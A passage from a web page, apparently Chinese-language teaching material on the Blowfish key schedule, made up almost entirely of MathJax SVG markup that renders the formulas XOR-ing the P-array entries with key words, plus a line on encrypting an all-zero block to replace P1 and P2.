554Z"></path></g><g data-mml-node="TeXAtom" transform="translate(675,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="mo" transform="translate(1356.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(2412.1,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="TeXAtom" transform="translate(675,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="mo" transform="translate(3712.9,0)"><path data-c="2295" d="M56 250Q56 394 156 488T384 583Q530 583 626 485T722 250Q722 110 625 14T390 -83Q249 -83 153 14T56 250ZM364 542Q308 539 251 509T148 418T96 278V270H369V542H364ZM681 278Q675 338 650 386T592 462T522 509T458 535T412 542H409V270H681V278ZM96 222Q104 150 139 95T219 12T302 -29T366 -42H369V230H96V222ZM681 222V230H409V-42H412Q429 -42 456 -36T521 -10T590 37T649 113T681 222Z"></path></g><g data-mml-node="msub" transform="translate(4713.1,0)"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g><g data-mml-node="TeXAtom" transform="translate(882,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></g></svg></mjx-container></p>
<p>  <mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="5.68ex" height="0.271ex" role="img" focusable="false" viewBox="0 -120 2510.7 120"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(1338.7,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g></g></g></svg></mjx-container></p>
<p>  <mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.375ex;" xmlns="http://www.w3.org/2000/svg" width="15.971ex" height="1.92ex" role="img" focusable="false" viewBox="0 -683 7059.3 848.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="TeXAtom" transform="translate(675,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1709.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(2765.7,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="TeXAtom" transform="translate(675,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(4420,0)"><path data-c="2295" d="M56 250Q56 394 156 488T384 583Q530 583 626 485T722 250Q722 110 625 14T390 -83Q249 -83 153 14T56 250ZM364 542Q308 539 251 509T148 418T96 278V270H369V542H364ZM681 278Q675 338 650 386T592 462T522 509T458 535T412 542H409V270H681V278ZM96 222Q104 150 139 95T219 12T302 -29T366 -42H369V230H96V222ZM681 222V230H409V-42H412Q429 -42 456 -36T521 -10T590 37T649 113T681 222Z"></path></g><g data-mml-node="msub" transform="translate(5420.2,0)"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g><g data-mml-node="TeXAtom" transform="translate(882,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container></p>
<p>  <mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="15.171ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 6705.8 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="TeXAtom" transform="translate(675,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1709.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(2765.7,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="TeXAtom" transform="translate(675,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(4420,0)"><path data-c="2295" d="M56 250Q56 394 156 488T384 583Q530 583 626 485T722 250Q722 110 625 14T390 -83Q249 -83 153 14T56 250ZM364 542Q308 539 251 509T148 418T96 278V270H369V542H364ZM681 278Q675 338 650 386T592 462T522 509T458 535T412 542H409V270H681V278ZM96 222Q104 150 139 95T219 12T302 -29T366 -42H369V230H96V222ZM681 222V230H409V-42H412Q429 -42 456 -36T521 -10T590 37T649 113T681 222Z"></path></g><g data-mml-node="msub" transform="translate(5420.2,0)"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g><g data-mml-node="TeXAtom" transform="translate(882,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></g></svg></mjx-container></p>
<p>  <mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="5.68ex" height="0.271ex" role="img" focusable="false" viewBox="0 -120 2510.7 120"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(1338.7,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g></g></g></svg></mjx-container></p>
<p>  <mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.375ex;" xmlns="http://www.w3.org/2000/svg" width="15.171ex" height="1.92ex" role="img" focusable="false" viewBox="0 -683 6705.8 848.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="TeXAtom" transform="translate(675,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1709.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(2765.7,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="TeXAtom" transform="translate(675,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(4420,0)"><path data-c="2295" d="M56 250Q56 394 156 488T384 583Q530 583 626 485T722 250Q722 110 625 14T390 -83Q249 -83 153 14T56 250ZM364 542Q308 539 251 509T148 418T96 278V270H369V542H364ZM681 278Q675 338 650 386T592 462T522 509T458 535T412 542H409V270H681V278ZM96 222Q104 150 139 95T219 12T302 -29T366 -42H369V230H96V222ZM681 222V230H409V-42H412Q429 -42 456 -36T521 -10T590 37T649 113T681 222Z"></path></g><g data-mml-node="msub" transform="translate(5420.2,0)"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g><g data-mml-node="TeXAtom" transform="translate(882,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g></g></g></g></g></svg></mjx-container></p>
</li>
<li><p>  使用上述生成的P数组和S盒加密全为0的64bits数据，输出64bits加密后的数据，代替<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="5.886ex" height="1.984ex" role="img" focusable="false" viewBox="0 -683 2601.8 877"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1523.2,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 